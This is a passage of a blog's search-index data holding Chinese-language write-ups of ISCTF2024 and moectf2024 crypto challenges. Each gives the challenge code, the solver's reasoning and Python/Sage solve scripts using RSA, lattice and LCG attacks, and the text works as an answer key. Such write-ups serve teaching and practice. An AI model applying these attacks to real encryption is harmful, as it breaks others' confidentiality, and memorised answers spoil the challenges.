gethint(h,p)) print('n =',n) #c = 587245179027322480379581200283415189810421958968516831191660631552695197401940961725169763339428980298128692606951200581483431566182271569207988054537414289564013883171160614196522169980339024564884190765084419167938640701193928669 #hint = 0.2427542737153618793334900104191212626446625872340179613972610728976081994921862517310186626304527115125924716035632505287111236596234811779375148657365336957626454491865164520834975233144235103885081268955448330597818844340656652982593545877449810282619387305007246499089258519062093814083383071737897364213169497762760797899310673216754376885295598952272100016962368762532805864796748393317534908268379601445004775495237901072144236328105526403608646831124542336002540011176406194984370372589752234640498423911217119220030242197564695880261480071310815379681250975672935544404797155655708441222387631967447088319826137200280810029390387418159394276760100487636516708987579464183208860911063948902432948269805493252899815187044807603000344378890835564906163242023600624338694473573763088471321731611077227112205396909637906507673367598721218000123789690455125909411309668615810240938664264212370815385282488986625554704015828254539339719586211726300858711328516487805251366293457402531199532556110786048074755505680210260049 #n = 839799159583571337450826982895478997157381520448790705455708438948150905361244823725400304016136863419723271227616684280477524669207590477657886623628732394537008838314015048569652202355464477680540884654473950183135276735347866051 思路：p和h直接连分数展开，basectf有一个与之类似的题，但是注意到是 $$8HP/16PP $$所以展开时其实是leak*2,后面是个基础的格，可以看detex佬的博客 exp hint = 0.2427542737153618793334900104191212626446625872340179613972610728976081994921862517310186626304527115125924716035632505287111236596234811779375148657365336957626454491865164520834975233144235103885081268955448330597818844340656652982593545877449810282619387305007246499089258519062093814083383071737897364213169497762760797899310673216754376885295598952272100016962368762532805864796748393317534908268379601445004775495237901072144236328105526403608646831124542336002540011176406194984370372589752234640498423911217119220030242197564695880261480071310815379681250975672935544404797155655708441222387631967447088319826137200280810029390387418159394276760100487636516708987579464183208860911063948902432948269805493252899815187044807603000344378890835564906163242023600624338694473573763088471321731611077227112205396909637906507673367598721218000123789690455125909411309668615810240938664264212370815385282488986625554704015828254539339719586211726300858711328516487805251366293457402531199532556110786048074755505680210260049 hint=hint*2 cf = continued_fraction(hint) for i in range(1000000000000): k = cf.numerator(i) x = cf.denominator(i) if is_prime(x) and x.bit_length() == 512: print(k,x) p,q = k,x break h=5644635742819829990750561229762805499221246439546826634192809053443196388050776487556004854931490257361050491682744164242094809598515347830480716371931526 p=11626233508536225614198811594320851252696454462193005033285647766940577053402735947923143276545500298338019376937355197687508293952240619015634703176724083 c=587245179027322480379581200283415189810421958968516831191660631552695197401940961725169763339428980298128692606951200581483431566182271569207988054537414289564013883171160614196522169980339024564884190765084419167938640701193928669 n=83979915958357133745082698289547899715738152044879070545570843894815090536124482372540030401613686341972327122761668428047752466920759047765788662","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:7","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"小蓝鲨的方程 task from Cryptodome.Util.number import * from random import * from gmpy2 import * import uuid flag1='ISCTF{'+str(uuid.uuid4())+'}' m1=bytes_to_long(flag1.encode()) def get_p(): BITS = 256 bits = 777 oder = 4 a = randint(1 \u003c\u003c bits, 1 \u003c\u003c bits + 1) p=getPrime(BITS) p1 = p**oder+a return p,p1 p,p1=get_p() s=getPrime(1024) q=getPrime(512) n=p*q**4 e=65537 c1=pow(s,e,n) c=pow(s**3+1,m1,s**5) print(\"c1=\",c1) print(\"c =\",c) print(\"n =\",n) print(\"p1 =\",p1) ''' c1= 671390498592586008552998377599101093977542184109077889081448730480869018650843045119891777468161631085086340705902115332025675787789530562679603254577287153918966364523848382506106179394235772395029788721306186952016420794804145631124905952103136061076643266886961178241381892015555099638200222249447194504082451341122502519637821695210573997670753981061458264118355417889153180841281073262935937836447460470926729282834006229571453935760593644658459098721652426154970766417292435960463905367868753821950303919781798234432998272038029063155193184039985018137026245365188171178677898869374676546799536208952198558258306460302868688355653022725288744014143221560882404431652751343944983442109327 c = 8641190030376811670503537177719719233418166235794962118828671236836174132083208517733734760455990850156371205118391537919769888760384574011411232571257192285256730733174399297826587479261381970232162702657952399683882650083181048279650913795429823628186888540572704055008102853692060360140858142686334722286525699998854566609078547487420929457446776757558492454916447188774943818970599916514467335772992690805247630814156710861067503956707301402347944233660194395192354000788262111000900574820275786269075882923600474781645848712157460135387134196156906258218217831988828360827613420801773911833194097791649069743116686685667300622630909231822986237104627385544169938138006242341269672868611269202418482629393372933567053272565557137741441902377611003983050084491513897727856173625922194300103448148829004025229567101761111396110940066254801762424343522707712480796358754008120503317686600144600226149617189681233392693738216138797012278242152852923361635415564580582002132107424154426980566696622448291815571736676562214017436 n = 1076246859437269645898003764327104347852443049519429833372038915264009774423737482018987571807662568251485615769880354898666799006772572239466617428164721157850526408878346223839884319846641438292436373441749602341461361190584638190903978829024853974880636148520803145113551453821058269641304504880310836801494499720662704717315748614372503735165114899680682056477494953525794354656896362929510309669119173103242509398650608116835276076364248473952717811633756784397347121601006659623317417388283638159905288128181587304367489096254611610975352096229116491567502061775862811850081040850421151385474249060884479729988512713640536139010928836126719149031115182144744359297169350288886555784650111 p1 = 145356063641618996012874664536921616978986640263438210169671010403677822239343590475177543891188656103067696467174379510912427160232486984044862545338401652910975162942038201716552753723984593267892098222213049269335313670049037479410635628460505327693176152061750827570561482918795206276991967169087371403553 ''' 思路：第一开始没想到和方程有什么关系，然后发现在最后面用到了，前面的p直接开方并且循环爆破一下，asssert一下，保证无错，然后求q，也assert验证一下，然后求出s，发现s很大，更别说s**5了，以下是思路 利用 二项式定理 对 (s^3 + 1)^m1 进行展开，并简化模 s^5 的表达式： $$ (s^3 + 1)^{m1} \\equiv 1 + m1 \\cdot s^3 \\mod s^5 $$ 因此，方程变为： $$ 1 + m1 \\cdot s^3 \\equiv c \\mod s^5 $$ 移项后得到： $$ m1 \\cdot s^3 \\equiv c - 1 \\mod s^5 $$ 由于 s^3 与 s^5 的关系，可以将 m1 表示为： $$ m1 \\equiv \\frac{c - 1}{s^3} \\mod s^2 $$ 这个方程表明，m1 可以通过以下步骤直接计算： 计算 (c - 1) // s^3： 确保 (c - 1) 能被 s^3 整除，否则方程无解。 取模 s^2：因为在模 s^5 下，m1 的值在模 s^2 的范围内是唯一确定的。 exp c1= 671390498592586008552998377599101093977542184109077889081448730480869018650843045119891777468161631085086340705902115332025675787789530562679603254577287153918966364523848382506106179394235772395029788721306186952016420794804145631124905952103136061076643266886961178241381892015555099638200","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:8","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"HIM（复现） task 附件好大的，直接去is下吧（哭哭 思路：这玩意的应该是https://github.com/spawnmason/randar-explanation 这个为基础出来的，代码审计一下，主要的main里边就是HIM会设置两个在-23440 到23440的随机数，分别为X，Z，我们的目标就是恢复这两个随机数，恢复5次即可。其实没啥思路，看了看wp，居然是LLL出来的，大概意思是我们通过到一些地方，生成坐标，然后利用坐标去LLL出seed，然后利用LCG伪随机的特性求出him的坐标正是给了him的范围，我们才能爆出来，挺好玩的，github的文档里面就有做法，直接用改改pwn库就行 exp from pwn import * sa = lambda s,n : p.sendafter(s,n) sla = lambda s,n : p.sendlineafter(s,n) sl = lambda s : p.sendline(s) sd = lambda s : p.send(s) rc = lambda n : p.recv(n) ru = lambda s : p.recvuntil(s) rl = lambda : p.recvline() it = lambda : p.interactive() ip = '' port = 0 p = remote(ip , port) # p = remote(\"127.0.0.1\", 8888) sla(\"请输入用户名: \",b\"guoql\") sla(\"=\u003e请选择：\",b\"start\") for _ in range(5): sla(\"输入yes投币开始:\",b\"yes\") sla(\"请选择：\",\"2\") sla(\"请输入想要挖掘的方块坐标(例： (1,1,1) )：\",b\"(1,1,1)\") data = rl().decode('utf-8') blockX,blockY,blockZ = tuple([float(\"0.\" + i.split(\".\")[1]) for i in data.split(\"Block drop in \")[1][:-1][1:-1].split(\", \")]) print(data,blockX,blockY,blockZ) randX = round(2 * 2**24 * (blockX - 0.25)) randY = round(2 * 2**24 * (blockY - 0.25)) randZ = round(2 * 2**24 * (blockZ - 0.25)) # 获取低24位数据 print(f\"{randX},{randY},{randZ}\") # 格基规约得到原始seed def crack(a0,b0,c0): a=25214903917 b=11 c=281474976710656 a1 = a0 * 2**24 + 2**23 b1 = b0 * 2**24 + 2**23 c1 = c0 * 2**24 + 2**23 v = vector([a1,b1 - b,c1 - b - a*b]) matex = matrix.zero(3) matex[0] = [1,a,a*a] matex[1] = [0,c,0] matex[2] = [0,0,c] lattice = matex.LLL() base = lattice.transpose().inverse() result = base*v final = vector([round(RDF(i)) for i in result]) solved = lattice.transpose() * final return solved seed = int(crack(randX, randY, randZ)[0]) # LCG线性同余求解出来上一个seed old_seed = ((seed - 11 ) * 246154705703781) % 2**48 # sagemath的异或是^^而不是^ HIM_seed = old_seed ^^ 0x5DEECE66D print(old_seed,HIM_seed) world_seed = 14617218721232814696 # input() # 寻找x，z需要满足在-23440 到 23400 的范围内 for x in range(-23440, 23441): z = ((HIM_seed - world_seed - 10387319 - x * 341873128712 ) * 211541297333629 ) % 2**48 if z \u003e= 2**48 + -23440 : z = z - 2**48 print(f\"x,z found:{x},{z}\") break if z \u003c= 23440: print(f\"x,z found:{x},{z}\") break sla(\"请选择：\", b\"1\") sla(\"请输入HIM所在区块的坐标(例: (10,-25) )：\", f\"({x},{z})\".encode('utf-8')) print(rl().decode('utf-8')) print(rl().decode('utf-8')) ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:9","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"总结 总的来说不难，但是那个压缩包我感觉挺没必要的，最后这个him感觉可以放个hint，只有L佬做出来了，害，被折磨了一天，其他的题都挺好的，没有出老套无聊的题，很适合我们这种刚入门的人，嘿嘿。 ","date":"2024-12-12","objectID":"/isctf2024_crypto/:3:0","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"题目 ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:0","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"现代密码学指北 task: from Crypto.Util.number import bytes_to_long, getPrime from secret import flag p = getPrime(128) q = getPrime(128) n = p*q e = 65537 m = bytes_to_long(flag) c = pow(m, e, n) print(f\"n = {n}\") print(f\"p = {p}\") print(f\"q = {q}\") print(f\"c = {c}\") ''' n = 40600296529065757616876034307502386207424439675894291036278463517602256790833 p = 197380555956482914197022424175976066223 q = 205695522197318297682903544013139543071 c = 36450632910287169149899281952743051320560762944710752155402435752196566406306 ''' 正常解密即可 exp n = 40600296529065757616876034307502386207424439675894291036278463517602256790833 p = 197380555956482914197022424175976066223 q = 205695522197318297682903544013139543071 c = 36450632910287169149899281952743051320560762944710752155402435752196566406306 e=65537 from Crypto.Util.number import* phi = (p-1)*(q-1) d = inverse(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:1","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"baby_equation task from Crypto.Util.number import * from secret import flag l = len(flag) m1, m2 = flag[:l//2], flag[l//2:] a = bytes_to_long(m1) b = bytes_to_long(m2) k = 0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40 assert ((a**2 + 1)*(b**2 + 1) - 2*(a - b)*(a*b - 1)) == 4*(k + a*b) 思路 其实就是因式分解会得到$(ab-1-a-b)^2=4k$,那么先开根号，再因式分解，再对因子进行排列组合就好 exp from gmpy2 import * from Crypto.Util.number import * from math import * k = 0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40 x = iroot(4*k,2) print(x) # factor(x) factors = [2,2,2,2,3,3,31,61,223,4013,281317,4151351,5404604441993, 26798471753993,25866088332911027256931479223,64889106213996537255229963986303510188999911,370523737,339386329] T = prod(factors) t = T ** 0.5 n = len(factors) dp = {1: []} for i in factors: for j in list(dp.keys()): cnt = j * i if cnt not in dp: dp[cnt] = dp[j] + [i] min = min(dp.keys(), key=lambda x: abs(x - t)) factor1 = min factor2 = T // min print(factor1) print(factor2) print(long_to_bytes(2948658764987911698882278955266869405625105496652193856947916257370492+1)) print(long_to_bytes(2950365559902224963252311699604518749050102395042841254385700637274676-1)) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:2","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"big and small task from secret import flag from Crypto.Util.number import* m = long_to_bytes(flag) p = getPrime(1024) q = getPrime(1024) n = p*q e = 3 c = pow(m,e,n) ''' c = 150409620528288093947185249913242033500530715593845912018225648212915478065982806112747164334970339684262757 e = 3 n = 20279309983698966932589436610174513524888616098014944133902125993694471293062261713076591251054086174169670848598415548609375570643330808663804049384020949389856831520202461767497906977295453545771698220639545101966866003886108320987081153619862170206953817850993602202650467676163476075276351519648193219850062278314841385459627485588891326899019745457679891867632849975694274064320723175687748633644074614068978098629566677125696150343248924059801632081514235975357906763251498042129457546586971828204136347260818828746304688911632041538714834683709493303900837361850396599138626509382069186433843547745480160634787 ''' 思路 小明文攻击 exp c = 150409620528288093947185249913242033500530715593845912018225648212915478065982806112747164334970339684262757 e = 3 n = 20279309983698966932589436610174513524888616098014944133902125993694471293062261713076591251054086174169670848598415548609375570643330808663804049384020949389856831520202461767497906977295453545771698220639545101966866003886108320987081153619862170206953817850993602202650467676163476075276351519648193219850062278314841385459627485588891326899019745457679891867632849975694274064320723175687748633644074614068978098629566677125696150343248924059801632081514235975357906763251498042129457546586971828204136347260818828746304688911632041538714834683709493303900837361850396599138626509382069186433843547745480160634787 from Crypto.Util.number import* from gmpy2 import* flag=iroot(c,e)[0] print(long_to_bytes(flag)) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:3","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"ez_hash task from hashlib import sha256 from secret import flag, secrets assert flag == b'moectf{' + secrets + b'}' assert secrets[:4] == b'2100' and len(secrets) == 10 hash_value = sha256(secrets).hexdigest() print(f\"{hash_value = }\") # hash_value = '3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a' 思路： 已知前四位，后六位未知，猜测都是数字，直接爆破 exp import hashlib target_hash = '3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a' for i in range(100000000): secrets_candidate = f'2100{i:06}'.encode() # 生成 '2100XXXXXX' 格式的字节串 if hashlib.sha256(secrets_candidate).hexdigest() == target_hash: flag = b'moectf{' + secrets_candidate + b'}' print(flag) break ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:4","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"signin task from Crypto.Util.number import* from secret import flag m = bytes_to_long(flag) p = getPrime(1024) q = getPrime(1024) n = p*q e = 65537 c = pow(m,e,n) pq = (p-1)*(q-2) qp = (q-1)*(p-2) p_q = p + q print(f\"{c = }\") print(f\"{pq = }\") print(f\"{qp = }\") print(f\"{n = }\") print(f\"{p_q = }\") ''' c = 5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746 pq = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462 qp = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860 n = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903 p_q = 279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496 ''' 思路 解方程 exp from sympy import symbols, Eq, solve p, q = symbols('p q') c = 5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746 pq = 1804701753928911427519501938409002653042575823662534712139490387998091461866963390266810035378891047014197664033767570057057312702069308117596198857162175971112206245219252692474476056178862570","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:5","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"大白兔 task from Crypto.Util.number import * flag = b'moectf{xxxxxxxxxx}' m = bytes_to_long(flag) e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137 e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697 def encrypt(m , e1 , e2): p = getPrime(512) q = getPrime(512) N = p*q c1 = pow((3*p + 7*q),e1,N) c2 = pow((2*p + 5*q),e2,N) e = 65537 c = pow(m , e , N) return c print(encrypt(m ,e1 , e2)) ''' N = 107840121617107284699019090755767399009554361670188656102287857367092313896799727185137951450003247965287300048132826912467422962758914809476564079425779097585271563973653308788065070590668934509937791637166407147571226702362485442679293305752947015356987589781998813882776841558543311396327103000285832158267 c1 = 15278844009298149463236710060119404122281203585460351155794211733716186259289419248721909282013233358914974167205731639272302971369075321450669419689268407608888816060862821686659088366316321953682936422067632021137937376646898475874811704685412676289281874194427175778134400538795937306359483779509843470045 c2 = 21094604591001258468822028459854756976693597859353651781642590543104398882448014423389799438692388258400734914492082531343013931478752601777032815369293749155925484130072691903725072096643826915317436719353858305966176758359761523170683475946913692317028587403027415142211886317152812178943344234591487108474 c = 21770231043448943684137443679409353766384859347908158264676803189707943062309013723698099073818477179441395009450511276043831958306355425252049047563947202180509717848175083113955255931885159933086221453965914552773593606054520151827862155643433544585058451821992566091775233163599161774796561236063625305050 ''' 思路 很经典的题目 $$ c1^e=(3p+7q)^{e1e2}=(3p)^{e1e2}+(7q)^{e1e2} mod N \\\\ c2^e=(2p+5q)^{e1e2}=(2p)^{e1e2}+(5q)^{e1e2} mod N \\\\ s=2^{e1e2}*c1^e-3^{e1e2}*c2^e=k*q^{e1e2} \\\\ GCD(s,N)=q $$求出q之后p也就出来了 exp from gmpy2 import* from Crypto.Util.number import * N = 107840121617107284699019090755767399009554361670188656102287857367092313896799727185137951450003247965287300048132826912467422962758914809476564079425779097585271563973653308788065070590668934509937791637166407147571226702362485442679293305752947015356987589781998813882776841558543311396327103000285832158267 c1 = 15278844009298149463236710060119404122281203585460351155794211733716186259289419248721909282013233358914974167205731639272302971369075321450669419689268407608888816060862821686659088366316321953682936422067632021137937376646898475874811704685412676289281874194427175778134400538795937306359483779509843470045 c2 = 21094604591001258468822028459854756976693597859353651781642590543104398882448014423389799438692388258400734914492082531343013931478752601777032815369293749155925484130072691903725072096643826915317436719353858305966176758359761523170683475946913692317028587403027415142211886317152812178943344234591487108474 c = 21770231043448943684137443679409353766384859347908158264676803189707943062309013723698099073818477179441395009450511276043831958306355425252049047563947202180509717848175083113955255931885159933086221453965914552773593606054520151827862155643433544585058451821992566091775233163599161774796561236063625305050 e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137 e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697 f1 = pow(2, e1*e2, N) * pow(c1, e2, N) f2 = pow(3, e1*e2, N) * pow(c2, e1, N) q = abs(gcd(N, f1-f2)) p = N//q print(p) print(q) phi= (p-1)*(q-1) e= 65537 d= inverse(e, phi) m= pow(c, d, N) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:6","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"More_secure_RSA task from Crypto.Util.number import * flag = b'moectf{xxxxxxxxxxxxxxxxx}' m = bytes_to_long(flag) p = getPrime(1024) q = getPrime(1024) n = p * q e = 0x10001 c = pow(m, e, n) print(f'c = {c}') print(f'n = {n}') ''' Oh,it isn't secure enough! ''' r = getPrime(1024) n = n * r c = pow(m, e, n) print(f'C = {c}') print(f'N = {n}') ''' c = 12992001402636687796268040906463852467529970619872166160007439409443075922491126428847990768804065656732371491774347799153093983118784555645908829567829548859716413703103209412482479508343241998746249393768508777622820076455330613128741381912099938105655018512573026861940845244466234378454245880629342180767100764598827416092526417994583641312226881576127632370028945947135323079587274787414572359073029332698851987672702157745794918609888672070493920551556186777642058518490585668611348975669471428437362746100320309846155934102756433753034162932191229328675448044938003423750406476228868496511462133634606503693079 n = 16760451201391024696418913179234861888113832949815649025201341186309388740780898642590379902259593220641452627925947802309781199156988046583854929589247527084026680464342103254634748964055033978328252761138909542146887482496813497896976832003216423447393810177016885992747522928136591835072195940398326424124029565251687167288485208146954678847038593953469848332815562187712001459140478020493313651426887636649268670397448218362549694265319848881027371779537447178555467759075683890711378208297971106626715743420508210599451447691532788685271412002723151323393995544873109062325826624960729007816102008198301645376867 C = 1227033973455439811038965425016278272592822512256148222404772464092642222302372689559402052996223110030680007093325025949747279355588869610656002059632685923872583886766517117583919384724629204452792737574445503481745695471566288752636639781636328540996436873887919128841538555313423836184797745537334236330889208413647074397092468650216303253820651869085588312638684722811238160039030594617522353067149762052873350299600889103069287265886917090425220904041840138118263873905802974197870859876987498993203027783705816687972808545961406313020500064095748870911561417904189058228917692021384088878397661756664374001122513267695267328164638124063984860445614300596622724681078873949436838102653185753255893379061574117715898417467680511056057317389854185497208849779847977169612242457941087161796645858881075586042016211743804958051233958262543770583176092221108309442538853893897999632683991081144231262128099816782478630830512 N = 1582486998399823540384313363363200260039711250093373548450892400684356890467422451159815746483347199068277830442685312502502514973605405506156013209395631708510855837597653498237290013890476973370263029834010665311042146273467094659451409034794827522542915103958741659248650774670557720668659089460310790788084368196624348469099001192897822358856214600885522908210687134137858300443670196386746010492684253036113022895437366747816728740885167967611021884779088402351311559013670949736441410139393856449468509407623330301946032314939458008738468741010360957434872591481558393042769373898724673597908686260890901656655294366875485821714239821243979564573095617073080807533166477233759321906588148907331569823186970816432053078415316559827307902239918504432915818595223579467402557885923581022810437311450172587275470923899187494633883841322542969792396699601487817033616266657366148353065324836976610554682254923012474470450197 ''' 思路 用r作为模数进行求解 exp from sympy import mod_inverse from Crypto.Util.number import long_to_bytes c = 129920014026366877962680409064638524675299706198721661600074394094430759224911264288479907688040656567323714917743477991530939831187845556459088295678295488597164137031032094124824795083432419987462493937685087776228200764553306131287413819120999381056550185125730268619408452444662343784542458806293421807671007645988274160925264179945836413122268815761276323700289459471353230795872747874145723590730293326988519876727021577457949186098886720704","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:7","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"ezlegendre task from sympy import * from Crypto.Util.number import * p = getPrime(128) e = randprime(2, p) FLAG = b'm' def encrypt_flag(flag): ciphertext = [] plaintext = ''.join([bin(i)[2:].zfill(8) for i in flag]) print(plaintext) for bit in plaintext: n = pow(int(bit) + e, e , p) ciphertext.append(n) return ciphertext print(f\"p = {p}\") print(encrypt_flag(FLAG)) 思路 只有两个数字，把83185897643827119919760550833655486588当作0，171219394072263643527316538070481587611当作1，就是01字符串，然后转字符就好了,数据太大，就不写了 exp conversion_dict = { 83185897643827119919760550833655486588: 0, 171219394072263643527316538070481587611: 1 } converted_c = [conversion_dict.get(x, x) for x in c] converted_c_str = ''.join(map(str, converted_c)) print(converted_c_str) s=b'01101101011011110110010101100011011101000110011001111011011011010110100101101110011101010111001101011111011011110110111001100101010111110011000101110011010111110110111000110000011101000101111101110001011101010011010001100100011100100011010001110100011010010110001101011111011100100011010001110011011010010110010001110101001101000101111101110111011010000110010101101110010111110111000001011111011011010110111101100100010111110110011000110000011101010111001001011111011001010111000101110101001101000011000101011111011101000110111101011111011101000110100001110010001100110011001101111101' binary_string = b'01101101011011110110010101100011011101000110011001111011011011010110100101101110011101010111001101011111011011110110111001100101010111110011000101110011010111110110111000110000011101000101111101110001011101010011010001100100011100100011010001110100011010010110001101011111011100100011010001110011011010010110010001110101001101000101111101110111011010000110010101101110010111110111000001011111011011010110111101100100010111110110011000110000011101010111001001011111011001010111000101110101001101000011000101011111011101000110111101011111011101000110100001110010001100110011001101111101' text = ''.join(chr(int(binary_string[i:i+8], 2)) for i in range(0, len(binary_string), 8)) print(text) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:8","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"new_system task from random import randint from Crypto.Util.number import getPrime,bytes_to_long flag = b'moectf{???????????????}' gift = bytes_to_long(flag) def parametergenerate(): q = getPrime(256) gift1 = randint(1, q) gift2 = (gift - gift1) % q x = randint(1, q) assert gift == (gift1 + gift2) % q return q , x , gift1, gift2 def encrypt(m , q , x): a = randint(1, q) c = (a*x + m) % q return [a , c] q , x , gift1 , gift2 = parametergenerate() print(encrypt(gift1 , q , x)) print(encrypt(gift2 , q , x)) print(encrypt(gift , q , x)) print(f'q = {q}') ''' [48152794364522745851371693618734308982941622286593286738834529420565211572487, 21052760152946883017126800753094180159601684210961525956716021776156447417961] [48649737427609115586886970515713274413023152700099032993736004585718157300141, 6060718815088072976566240336428486321776540407635735983986746493811330309844] [30099883325957937700435284907440664781247503171217717818782838808179889651361, 85333708281128255260940125642017184300901184334842582132090488518099650581761] q = 105482865285555225519947662900872028851795846950902311343782163147659668129411 ''' 思路 $$ c_i = a_i*x+g \\mod q \\\\ C = (a_1+a_2)*x+g \\mod q \\\\ d = (a_1+a_2-a_3)*x \\mod q $$带入求解就行了 exp from Crypto.Util.number import inverse, long_to_bytes a1, c1 = 48152794364522745851371693618734308982941622286593286738834529420565211572487, 21052760152946883017126800753094180159601684210961525956716021776156447417961 a2, c2 = 48649737427609115586886970515713274413023152700099032993736004585718157300141, 6060718815088072976566240336428486321776540407635735983986746493811330309844 a3, c3 = 30099883325957937700435284907440664781247503171217717818782838808179889651361, 85333708281128255260940125642017184300901184334842582132090488518099650581761 q = 105482865285555225519947662900872028851795846950902311343782163147659668129411 x = ((c3 - c2 - c1) * inverse(a3 - a2 - a1, q)) % q gift1 = (c1 - a1 * x) % q gift2 = (c2 - a2 * x) % q gift = (gift1 + gift2) % q flag = long_to_bytes(gift) print(flag) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:9","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"RSA_revenge task from Crypto.Util.number import getPrime, isPrime, bytes_to_long from secret import flag def emirp(x): y = 0 while x !=0: y = y*2 + x%2 x = x//2 return y while True: p = getPrime(512) q = emirp(p) if isPrime(q): break n = p*q e = 65537 m = bytes_to_long(flag) c = pow(m,e,n) print(f\"{n = }\") print(f\"{c = }\") \"\"\" n = 141326884939079067429645084585831428717383389026212274986490638181168709713585245213459139281395768330637635670530286514361666351728405851224861268366256203851725349214834643460959210675733248662738509224865058748116797242931605149244469367508052164539306170883496415576116236739853057847265650027628600443901 c = 47886145637416465474967586561554275347396273686722042112754589742652411190694422563845157055397690806283389102421131949492150512820301748529122456307491407924640312270962219946993529007414812671985960186335307490596107298906467618684990500775058344576523751336171093010950665199612378376864378029545530793597 \"\"\" 思路 可以看看https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/ exp n = 141326884939079067429645084585831428717383389026212274986490638181168709713585245213459139281395768330637635670530286514361666351728405851224861268366256203851725349214834643460959210675733248662738509224865058748116797242931605149244469367508052164539306170883496415576116236739853057847265650027628600443901 def t(a, b, k): if k == 256: if a*b == n: print(a, b) return for i in range(2): for j in range(2): a1 = a + i*(2**k) + j*(2**(511-k)) b1 = b + j*(2**k) + i*(2**(511-k)) if a1*b1 \u003e n: continue if 